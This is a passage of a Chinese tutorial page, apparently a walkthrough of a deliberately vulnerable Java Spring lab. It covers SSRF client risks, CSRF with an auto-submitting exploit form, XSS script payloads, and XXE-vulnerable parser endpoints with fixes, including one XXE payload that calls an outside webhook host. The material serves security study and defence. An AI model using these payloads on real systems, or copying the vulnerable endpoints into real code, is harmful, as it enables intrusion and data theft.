默认无限等待`)]),i(`tr`,null,[i(`td`,null,[i(`strong`,null,`HTTP/2 支持`)]),i(`td`,null,`✅ 支持`),i(`td`,null,`❌ 不支持（需额外模块）`),i(`td`,null,`❌ 不支持`),i(`td`,null,`❌ 不支持`),i(`td`,null,`❌ 不支持`)]),i(`tr`,null,[i(`td`,null,[i(`strong`,null,`API 复杂度`)]),i(`td`,null,`简单，链式调用`),i(`td`,null,`相对复杂，配置灵活`),i(`td`,null,`老旧 API，繁琐`),i(`td`,null,`最简单`),i(`td`,null,`最原始`)]),i(`tr`,null,[i(`td`,null,[i(`strong`,null,`维护情况`)]),i(`td`,null,`活跃（Square 维护）`),i(`td`,null,`活跃（Apache 维护）`),i(`td`,null,`❌ 已停止维护`),i(`td`,null,`活跃（Jsoup 团队）`),i(`td`,null,`JDK 自带，无新特性`)]),i(`tr`,null,[i(`td`,null,[i(`strong`,null,`SSRF 风险`)]),i(`td`,null,[i(`strong`,null,`低`),r(`（默认禁止 file://）`)]),i(`td`,null,[i(`strong`,null,`低`),r(`（默认禁止 file://）`)]),i(`td`,null,`中（可能支持 file://）`),i(`td`,null,[i(`strong`,null,`高`),r(`（默认支持 file://）`)]),i(`td`,null,[i(`strong`,null,`高`),r(`（支持 file://、gopher://）`)])]),i(`tr`,null,[i(`td`,null,[i(`strong`,null,`适用场景`)]),i(`td`,null,`通用 HTTP 请求、API 调用、移动端`),i(`td`,null,`企业后端、复杂 HTTP 请求`),i(`td`,null,`维护遗留系统`),i(`td`,null,`爬虫、HTML 解析`),i(`td`,null,`小工具快速读取流`)]),i(`tr`,null,[i(`td`,null,[i(`strong`,null,`是否推荐新项目使用`)]),i(`td`),i(`td`),i(`td`),i(`td`),i(`td`)])])],-1),s[226]||=i(`p`,null,[i(`strong`,null,`总结`)],-1),s[227]||=i(`ul`,null,[i(`li`,null,[i(`strong`,null,`OkHttp`),r(` 是一个现代且灵活的 HTTP 客户端，性能好，适用于大多数 HTTP 通信任务。`)]),i(`li`,null,[i(`strong`,null,`HttpClient`),r(` 更适合复杂的 HTTP 通信场景，有较强的功能支持，如认证、重定向等，但相对复杂，适合大型项目。`)]),i(`li`,null,[i(`strong`,null,`CommonHttpClient`),r(` 已经过时，主要用于老项目的兼容，不推荐在新项目中使用。`)]),i(`li`,null,[i(`strong`,null,`Jsoup`),r(` 适合处理 HTML 解析任务和轻量的 HTTP 请求，专注于网页抓取和数据提取。`)]),i(`li`,null,[i(`strong`,null,`IOUtils`),r(` 则是一个简化的工具，主要用于读取 URL 内容并转换为字节流，适合简单的小数据传输。`)])],-1),s[228]||=i(`p`,null,`（4）核心SSRF防护代码`,-1),s[229]||=i(`p`,null,`修复代码：`,-1),s[230]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`public class SocketHook {

    public static void startHook() throws IOException {
        SocketHookFactory.initSocket();
        SocketHookFactory.setHook(true);
        try{
            Socket.setSocketImplFactory(new SocketHookFactory());
        }catch (SocketException ignored){
        }
    }

    public static void stopHook(){
        SocketHookFactory.setHook(false);
    }
}
java复制代码123456789101112131415
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[231]||=i(`p`,null,[i(`strong`,null,`功能分析`),r(`：`)],-1),s[232]||=i(`ul`,null,[i(`li`,null,[i(`p`,null,[i(`code`,null,`startHook()`)]),i(`p`,null,`:`),i(`ul`,null,[i(`li`,null,[r(`启动 `),i(`code`,null,`SocketHook`),r(`，对所有新创建的 `),i(`code`,null,`Socket`),r(` 应用自定义行为。核心是通过 `),i(`code`,null,`Socket.setSocketImplFactory()`),r(` 来设置一个新的 `),i(`code`,null,`Socket`),r(` 工厂。`)]),i(`li`,null,[r(`可能用于在 `),i(`code`,null,`Socket`),r(` 连接期间监控、修改、或审查数据流量。`)])])]),i(`li`,null,[i(`p`,null,[i(`code`,null,`stopHook()`)]),i(`p`,null,`:`),i(`ul`,null,[i(`li`,null,[r(`关闭 `),i(`code`,null,`SocketHook`),r(`，将 `),i(`code`,null,`SocketHookFactory`),r(` 中的钩子状态关闭，停止对新 `),i(`code`,null,`Socket`),r(` 实例的自定义行为。`)])])])],-1),s[233]||=i(`p`,null,[i(`strong`,null,`应用场景`),r(`：`)],-1),s[234]||=i(`ul`,null,[i(`li`,null,[i(`strong`,null,`安全防护`),r(`：可以用来检测、拦截或修改特定的网络连接，防止攻击（如 SSRF、RFI 等）通过不受控制的网络请求滥用服务器资源。`)]),i(`li`,null,[i(`strong`,null,`网络审计`),r(`：可用于监控网络流量，以记录或分析 `),i(`code`,null,`Socket`),r(` 通信内容。`)]),i(`li`,null,[i(`strong`,null,`调试/测试`),r(`：在调试或测试环境中，使用钩子来捕获和分析网络通信行为。`)])],-1),s[235]||=i(`h3`,{id:`csrf`,tabindex:`-1`},[r(`CSRF `),i(`a`,{class:`header-anchor`,href:`#csrf`,"aria-label":`Permalink to "CSRF"`},`​`)],-1),s[236]||=i(`p`,null,`原理：`,-1),s[237]||=i(`p`,null,`CSRF (Cross-site request forgery，跨站请求伪造)也被称为One Click Attack或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本(XSS)，但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户请求受信任的网站。`,-1),s[238]||=i(`p`,null,`简单的说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己以前认证过的站点并运行一些操作（如发邮件，发消息，甚至财产操作（如转账和购买商品））。因为浏览器之前认证过，所以被访问的站点会觉得这是真正的用户操作而去运行。`,-1),s[239]||=i(`p`,null,[i(`strong`,null,`攻击流程：`)],-1),s[240]||=i(`ol`,null,[i(`li`,null,`用户在浏览器中登录了受信任的网站（如银行网站），并且拥有有效的会话。`),i(`li`,null,`攻击者创建了一个恶意网站，嵌入了向受信任网站发送请求的代码。`),i(`li`,null,`用户在登录受信任网站后，访问了攻击者的恶意网站，恶意网站在用户不知情的情况下，自动向受信任网站发送请求（如转账请求）。`),i(`li`,null,`受信任的网站无法区分该请求是用户发起的还是攻击者伪造的，因此会执行这个请求`)],-1),s[241]||=i(`h4`,{id:`_1-csrf-post`,tabindex:`-1`},[r(`1./csrf/post `),i(`a`,{class:`header-anchor`,href:`#_1-csrf-post`,"aria-label":`Permalink to "1./csrf/post"`},`​`)],-1),s[242]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`@Controller
@RequestMapping("/csrf")
public class CSRF {

    @GetMapping("/")
    public String index() {
        return "form";
    }

    @PostMapping("/post")
    @ResponseBody
    public String post() {
        return "CSRF passed.";
    }
}

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[243]||=i(`p`,null,`我们来看前端`,-1),s[244]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`
<html xmlns:th="http://www.thymeleaf.org" lang="en">
<head>
    <script th:src="@{https://code.jquery.com/jquery-3.4.1.min.js}"><\/script>
</head>

<body>

<div>
    <!-- th:action with Spring 3.2+ and Thymeleaf 2.1+ can automatically force Thymeleaf to include the CSRF token as a hidden field -->
    <!-- <form name="f" th:action="@{/csrf/post}" method="post"> -->
    <form name="f" action="/csrf/post" method="post">
        <input type="text" name="input" />
        <input type="submit" value="Submit" />
        <input type="hidden" th:name="\${_csrf.parameterName}" th:value="\${_csrf.token}" />
    </form>
</div>

</body>

</html>

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[245]||=i(`p`,null,`该代码存在csrf漏洞，漏洞验证poc：`,-1),s[246]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF Exploit</title>
</head>
<body>
    <h1>Simulating CSRF Attack</h1>

    <form id="csrfForm" action="http://127.0.0.1:8080/csrf/post" method="POST">
        <input type="hidden" name="message" value="This is a CSRF attack message">
    </form>

    <script>
        // 自动提交表单，执行攻击
        document.getElementById('csrfForm').submit();
    <\/script>
</body>
</html>

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[247]||=i(`h4`,{id:`csrf的防护`,tabindex:`-1`},[r(`csrf的防护 `),i(`a`,{class:`header-anchor`,href:`#csrf的防护`,"aria-label":`Permalink to "csrf的防护"`},`​`)],-1),s[248]||=i(`ol`,null,[i(`li`,null,`使用CSRF Token`)],-1),s[249]||=i(`p`,null,`在每个表单或请求中，加入一个随机生成的token，并将其与服务器端的token进行对比。这个token通常存储在用户的session中，每次请求时都要携带这个token，防止外部网站伪造请求。`,-1),s[250]||=i(`ul`,null,[i(`li`,null,`在HTML表单中加入一个隐藏的input字段来传递CSRF token。`),i(`li`,null,`在服务器端验证请求中的token是否与存储的一致。`)],-1),s[251]||=i(`ol`,{start:`2`},[i(`li`,null,`Referer Header 检查`)],-1),s[252]||=i(`p`,null,[r(`检查请求中的`),i(`code`,null,`Referer`),r(` header，确保请求来源是合法的站点。尽管这一方法并不完全可靠，因为有些浏览器可能会限制或不发送`),i(`code`,null,`Referer`),r(`，但它可以作为额外的安全措施。`)],-1),s[253]||=i(`ol`,{start:`3`},[i(`li`,null,`SameSite Cookie 属性`)],-1),s[254]||=i(`p`,null,[r(`使用`),i(`code`,null,`SameSite`),r(`属性设置cookies，限制跨站请求时是否可以发送cookie。`),i(`code`,null,`SameSite`),r(`有三个值：`)],-1),s[255]||=i(`ul`,null,[i(`li`,null,[i(`code`,null,`Strict`),r(`：完全禁止跨站请求携带cookie。`)]),i(`li`,null,[i(`code`,null,`Lax`),r(`：只有部分跨站请求才携带cookie（例如从外部链接访问站点时）。`)]),i(`li`,null,[i(`code`,null,`None`),r(`：允许跨站请求携带cookie，但必须设置`),i(`code`,null,`Secure`),r(`，即请求需要使用HTTPS。`)])],-1),s[256]||=i(`ol`,{start:`4`},[i(`li`,null,`HTTP 方法限制`)],-1),s[257]||=i(`p`,null,[r(`对于敏感操作，尽量使用`),i(`code`,null,`POST`),r(`、`),i(`code`,null,`PUT`),r(`、`),i(`code`,null,`DELETE`),r(`等非GET方法，因为GET请求一般不带有请求体，容易被CSRF利用。并且可以通过在服务器端验证请求方法是否符合规范来增加安全性。`)],-1),s[258]||=i(`ol`,{start:`5`},[i(`li`,null,`验证码（CAPTCHA）`)],-1),s[259]||=i(`p`,null,`在执行重要操作（如提交表单或修改敏感信息）时，加入验证码验证，确保操作是由真实用户执行，而不是自动化脚本。`,-1),s[260]||=i(`ol`,{start:`6`},[i(`li`,null,`双重身份验证（2FA）`)],-1),s[261]||=i(`p`,null,`结合身份验证措施，如短信验证码或应用生成的二次密码，在用户执行敏感操作时进一步确认其身份。`,-1),s[262]||=i(`h3`,{id:`xss`,tabindex:`-1`},[r(`XSS `),i(`a`,{class:`header-anchor`,href:`#xss`,"aria-label":`Permalink to "XSS"`},`​`)],-1),s[263]||=i(`h4`,{id:`_1-xss-reflect`,tabindex:`-1`},[r(`1./xss/reflect `),i(`a`,{class:`header-anchor`,href:`#_1-xss-reflect`,"aria-label":`Permalink to "1./xss/reflect"`},`​`)],-1),s[264]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`    @RequestMapping("/reflect")
    @ResponseBody
    public static String reflect(String xss) {
        return xss;
    }
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[265]||=i(`p`,null,`反射型xss`,-1),s[266]||=i(`p`,null,`利用`,-1),s[267]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`?xss=<script>alert(1)<\/script>
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[268]||=i(`figure`,null,[i(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251640728.png`,alt:`image-20250725164023603`,loading:`lazy`,decoding:`async`})],-1),s[269]||=i(`h4`,{id:`_2-xss-stored`,tabindex:`-1`},[r(`2./xss/stored `),i(`a`,{class:`header-anchor`,href:`#_2-xss-stored`,"aria-label":`Permalink to "2./xss/stored"`},`​`)],-1),s[270]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,` @RequestMapping("/stored/store")
    @ResponseBody
    public String store(String xss, HttpServletResponse response) {
        Cookie cookie = new Cookie("xss", xss);
        response.addCookie(cookie);
        return "Set param into cookie";
    }

    /**
     * Vul Code.
     * StoredXSS Step2
     * http://localhost:8080/xss/stored/show
     *
     * @param xss unescape string
     */
    @RequestMapping("/stored/show")
    @ResponseBody
    public String show(@CookieValue("xss") String xss) {
        return xss;
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[271]||=i(`p`,null,`存储型xss，我们先在/stored/store路由存入Cookie`,-1),s[272]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`?xss=<script>alert(1)<\/script>
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[273]||=i(`figure`,null,[i(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251643828.png`,alt:`image-20250725164345723`,loading:`lazy`,decoding:`async`})],-1),s[274]||=i(`p`,null,`然后在/stored/show路由攻击`,-1),s[275]||=i(`figure`,null,[i(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251644303.png`,alt:`image-20250725164425228`,loading:`lazy`,decoding:`async`})],-1),s[276]||=i(`h4`,{id:`xss防护`,tabindex:`-1`},[r(`xss防护 `),i(`a`,{class:`header-anchor`,href:`#xss防护`,"aria-label":`Permalink to "xss防护"`},`​`)],-1),s[277]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,` /**
     * safe Code.
     * http://localhost:8080/xss/safe
     */
    @RequestMapping("/safe")
    @ResponseBody
    public static String safe(String xss) {
        return encode(xss);
    }

    private static String encode(String origin) {
        origin = StringUtils.replace(origin, "&", "&amp;");
        origin = StringUtils.replace(origin, "<", "&lt;");
        origin = StringUtils.replace(origin, ">", "&gt;");
        origin = StringUtils.replace(origin, "\\"", "&quot;");
        origin = StringUtils.replace(origin, "'", "&#x27;");
        origin = StringUtils.replace(origin, "/", "&#x2F;");
        return origin;
    }
}

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[278]||=i(`p`,null,`把需要的字符都过滤了基本就防完了xss攻击`,-1),s[279]||=i(`h3`,{id:`xxe`,tabindex:`-1`},[r(`XXE `),i(`a`,{class:`header-anchor`,href:`#xxe`,"aria-label":`Permalink to "XXE"`},`​`)],-1),s[280]||=i(`h4`,{id:`_1-xxe-xmlreader-vuln`,tabindex:`-1`},[r(`1./xxe/xmlReader/vuln `),i(`a`,{class:`header-anchor`,href:`#_1-xxe-xmlreader-vuln`,"aria-label":`Permalink to "1./xxe/xmlReader/vuln"`},`​`)],-1),s[281]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},`    @PostMapping("/xmlReader/vuln")
    public String xmlReaderVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);
            XMLReader xmlReader = XMLReaderFactory.createXMLReader();
            xmlReader.parse(new InputSource(new StringReader(body)));  // parse xml
            return "xmlReader xxe vuln code";
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
    }
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[282]||=i(`h4`,{id:`_2-xxe-saxbuilder-vuln`,tabindex:`-1`},[r(`2./xxe/SAXBuilder/vuln `),i(`a`,{class:`header-anchor`,href:`#_2-xxe-saxbuilder-vuln`,"aria-label":`Permalink to "2./xxe/SAXBuilder/vuln"`},`​`)],-1),s[283]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`@RequestMapping(value = "/SAXBuilder/vuln", method = RequestMethod.POST)
    public String SAXBuilderVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXBuilder builder = new SAXBuilder();
            // org.jdom2.Document document
            builder.build(new InputSource(new StringReader(body)));  // cause xxe
            return "SAXBuilder xxe vuln code";
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
    }
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[284]||=i(`p`,null,`换用SAXReader第三方库，攻击手法同上（注意请求要以http格式进行解析）：`,-1),s[285]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`<?xml version="1.0" encoding="utf-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://webhook.site/186f2ce9-cf0c-4eda-ad3f-49c3873814a7">]><root>&xxe;</root>

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[286]||=i(`figure`,null,[i(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251712331.png`,alt:`image-20250725171230237`,loading:`lazy`,decoding:`async`})],-1),s[287]||=i(`h4`,{id:`修复代码`,tabindex:`-1`},[r(`修复代码 `),i(`a`,{class:`header-anchor`,href:`#修复代码`,"aria-label":`Permalink to "修复代码"`},`​`)],-1),s[288]||=i(`p`,null,[r(`通过`),i(`code`,null,`setFeature`),r(`关闭DTD和外部实体解析从而防止了xxe`)],-1),s[289]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`    @RequestMapping(value = "/xmlReader/sec", method = RequestMethod.POST)
    public String xmlReaderSec(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            XMLReader xmlReader = XMLReaderFactory.createXMLReader();
            // fix code start
            xmlReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            xmlReader.setFeature("http://xml.org/sax/features/external-general-entities", false);
            xmlReader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
            //fix code end
            xmlReader.parse(new InputSource(new StringReader(body)));  // parse xml

        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }

        return "xmlReader xxe security code";
    }
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[290]||=i(`h4`,{id:`_3-xxe-saxreader-vuln`,tabindex:`-1`},[r(`3./xxe/SAXReader/vuln `),i(`a`,{class:`header-anchor`,href:`#_3-xxe-saxreader-vuln`,"aria-label":`Permalink to "3./xxe/SAXReader/vuln"`},`​`)],-1),s[291]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`@RequestMapping(value = "/SAXReader/vuln", method = RequestMethod.POST)
    public String SAXReaderVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXReader reader = new SAXReader();
            // org.dom4j.Document document
            reader.read(new InputSource(new StringReader(body))); // cause xxe

        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }

        return "SAXReader xxe vuln code";
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[292]||=i(`p`,null,`和前两个的payload一样但区别是这个有回显`,-1),s[293]||=i(`h4`,{id:`_4-xxe-saxparser-vuln`,tabindex:`-1`},[r(`4./xxe/SAXParser/vuln `),i(`a`,{class:`header-anchor`,href:`#_4-xxe-saxparser-vuln`,"aria-label":`Permalink to "4./xxe/SAXParser/vuln"`},`​`)],-1),s[294]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`  @RequestMapping(value = "/SAXParser/vuln", method = RequestMethod.POST)
    public String SAXParserVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXParserFactory spf = SAXParserFactory.newInstance();
            SAXParser parser = spf.newSAXParser();
            parser.parse(new InputSource(new StringReader(body)), new DefaultHandler());  // parse xml

            return "SAXParser xxe vuln code";
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[295]||=i(`h4`,{id:`_5-xxe-digester-vuln`,tabindex:`-1`},[r(`5./xxe/Digester/vuln `),i(`a`,{class:`header-anchor`,href:`#_5-xxe-digester-vuln`,"aria-label":`Permalink to "5./xxe/Digester/vuln"`},`​`)],-1),s[296]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`@RequestMapping(value = "/Digester/vuln", method = RequestMethod.POST)
    public String DigesterVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            Digester digester = new Digester();
            digester.parse(new StringReader(body));  // parse xml
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
        return "Digester xxe vuln code";
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[297]||=i(`h4`,{id:`_6-xxe-documentbuilder-vuln`,tabindex:`-1`},[r(`6./xxe/DocumentBuilder/vuln `),i(`a`,{class:`header-anchor`,href:`#_6-xxe-documentbuilder-vuln`,"aria-label":`Permalink to "6./xxe/DocumentBuilder/vuln"`},`​`)],-1),s[298]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`@RequestMapping(value = "/DocumentBuilder/vuln", method = RequestMethod.POST)
    public String DocumentBuilderVuln(HttpServletRequest request) {
        try {
            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
            DocumentBuilder db = dbf.newDocumentBuilder();
            InputSource is = new InputSource(request.getInputStream());
            Document document = db.parse(is);  // parse xml

            // 遍历xml节点name和value
            StringBuilder buf = new StringBuilder();
            NodeList rootNodeList = document.getChildNodes();
            for (int i = 0; i < rootNodeList.getLength(); i++) {
                Node rootNode = rootNodeList.item(i);
                NodeList child = rootNode.getChildNodes();
                for (int j = 0; j < child.getLength(); j++) {
                    Node node = child.item(j);
                    buf.append(String.format("%s: %s\\n", node.getNodeName(), node.getTextContent()));
                }
            }
            return buf.toString();
        } catch (Exception e) {
            e.printStackTrace();
            logger.error(e.toString());
            return e.toString();
        }
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[299]||=i(`p`,null,`这是JDK自带的类，以此产生的XXE是存在回显的`,-1),s[300]||=i(`h4`,{id:`_7-xxe-documentbuilder-xinclude-vuln`,tabindex:`-1`},[r(`7./xxe/DocumentBuilder/xinclude/vuln `),i(`a`,{class:`header-anchor`,href:`#_7-xxe-documentbuilder-xinclude-vuln`,"aria-label":`Permalink to "7./xxe/DocumentBuilder/xinclude/vuln"`},`​`)],-1),s[301]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`@RequestMapping(value = "/DocumentBuilder/xinclude/vuln", method = RequestMethod.POST)
    public String DocumentBuilderXincludeVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
            dbf.setXIncludeAware(true);   // 支持XInclude
            dbf.setNamespaceAware(true);  // 支持XInclude
            DocumentBuilder db = dbf.newDocumentBuilder();
            StringReader sr = new StringReader(body);
            InputSource is = new InputSource(sr);
            Document document = db.parse(is);  // parse xml

            NodeList rootNodeList = document.getChildNodes();
            response(rootNodeList);

            sr.close();
            return "DocumentBuilder xinclude xxe vuln code";
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[302]||=i(`h4`,{id:`_8-xxe-xmlreader-vuln`,tabindex:`-1`},[r(`8./xxe/XMLReader/vuln `),i(`a`,{class:`header-anchor`,href:`#_8-xxe-xmlreader-vuln`,"aria-label":`Permalink to "8./xxe/XMLReader/vuln"`},`​`)],-1),s[303]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`@PostMapping("/XMLReader/vuln")
    public String XMLReaderVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXParserFactory spf = SAXParserFactory.newInstance();
            SAXParser saxParser = spf.newSAXParser();
            XMLReader xmlReader = saxParser.getXMLReader();
            xmlReader.parse(new InputSource(new StringReader(body)));

        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }

        return "XMLReader xxe vuln code";
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[304]||=i(`h4`,{id:`_9-xxe-documenthelper-vuln`,tabindex:`-1`},[r(`9./xxe/DocumentHelper/vuln `),i(`a`,{class:`header-anchor`,href:`#_9-xxe-documenthelper-vuln`,"aria-label":`Permalink to "9./xxe/DocumentHelper/vuln"`},`​`)],-1),s[305]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`@PostMapping("/DocumentHelper/vuln")
    public String DocumentHelper(HttpServletRequest req) {
        try {
            String body = WebUtils.getRequestBody(req);
            DocumentHelper.parseText(body); // parse xml
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }

        return "DocumentHelper xxe vuln code";
    }

    private static void response(NodeList rootNodeList){
        for (int i = 0; i < rootNodeList.getLength(); i++) {
            Node rootNode = rootNodeList.item(i);
            NodeList xxe = rootNode.getChildNodes();
            for (int j = 0; j < xxe.getLength(); j++) {
                Node xxeNode = xxe.item(j);
                // 测试不能blind xxe，所以强行加了一个回显
                logger.info("xxeNode: " + xxeNode.getNodeValue());
            }

        }
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[306]||=i(`p`,null,`修复该漏洞只需升级dom4j到2.1.1及以上，该版本及以上禁用了ENTITY；不带ENTITY的PoC不能利用，所以禁用ENTITY即可完成修复。`,-1),s[307]||=i(`h4`,{id:`上述存在xxe漏洞库对比`,tabindex:`-1`},[r(`上述存在XXE漏洞库对比 `),i(`a`,{class:`header-anchor`,href:`#上述存在xxe漏洞库对比`,"aria-label":`Permalink to "上述存在XXE漏洞库对比"`},`​`)],-1),s[308]||=i(`table`,null,[i(`thead`,null,[i(`tr`,null,[i(`th`,{style:{"text-align":`left`}},[i(`strong`,null,`工具/类`)]),i(`th`,{style:{"text-align":`left`}},[i(`strong`,null,`简介`)]),i(`th`,{style:{"text-align":`left`}},[i(`strong`,null,`使用场景`)]),i(`th`,{style:{"text-align":`left`}},[i(`strong`,null,`优点`)]),i(`th`,{style:{"text-align":`left`}},[i(`strong`,null,`缺点`)])])]),i(`tbody`,null,[i(`tr`,null,[i(`td`,{style:{"text-align":`left`}},[i(`code`,null,`xmlReader`)]),i(`td`,{style:{"text-align":`left`}},`SAX 的接口，基于事件驱动的解析`),i(`td`,{style:{"text-align":`left`}},`处理大型 XML 文件`),i(`td`,{style:{"text-align":`left`}},`内存占用小，速度快`),i(`td`,{style:{"text-align":`left`}},`需要手动管理上下文，处理复杂结构困`)]),i(`tr`,null,[i(`td`,{style:{"text-align":`left`}},[i(`code`,null,`SAXBuilder`)]),i(`td`,{style:{"text-align":`left`}},`JDOM 中基于 SAX 的解析器`),i(`td`,{style:{"text-align":`left`}},`需要用 JDOM 处理 XML 数据时`),i(`td`,{style:{"text-align":`left`}},`结合了 SAX 的高效性和 JDOM 的易用性`),i(`td`,{style:{"text-align":`left`}},`解析速度依赖于 SAX，灵活性低于 DOM`)]),i(`tr`,null,[i(`td`,{style:{"text-align":`left`}},"SAXReader`"),i(`td`,{style:{"text-align":`left`}},`Dom4j 中基于 SAX 的解析器`),i(`td`,{style:{"text-align":`left`}},`需要 Dom4j 进行 XML 操作时`),i(`td`,{style:{"text-align":`left`}},`高效且灵活，支持树结构`),i(`td`,{style:{"text-align":`left`}},`性能略逊于纯 SAX`)]),i(`tr`,null,[i(`td`,{style:{"text-align":`left`}},[i(`code`,null,`SAXParser`)]),i(`td`,{style:{"text-align":`left`}},`Java 中的 SAX 解析器`),i(`td`,{style:{"text-align":`left`}},`基于事件驱动的解析，适合处理大型 XML 文件`),i(`td`,{style:{"text-align":`left`}},`高效，内存占用小`),i(`td`,{style:{"text-align":`left`}},`解析复杂 XML 需要手动处理回调`)]),i(`tr`,null,[i(`td`,{style:{"text-align":`left`}},"Digester`"),i(`td`,{style:{"text-align":`left`}},`基于 SAX，将 XML 映射到 Java 对象（Apache Commons 提供）`),i(`td`,{style:{"text-align":`left`}},`需要将 XML 映射为 Java 对象时`),i(`td`,{style:{"text-align":`left`}},`简化 XML 与 Java 对象的映射`),i(`td`,{style:{"text-align":`left`}},`对大文件不友好，灵活性较低`)]),i(`tr`,null,[i(`td`,{style:{"text-align":`left`}},"DocumentBuilder`"),i(`td`,{style:{"text-align":`left`}},`Java 中 DOM 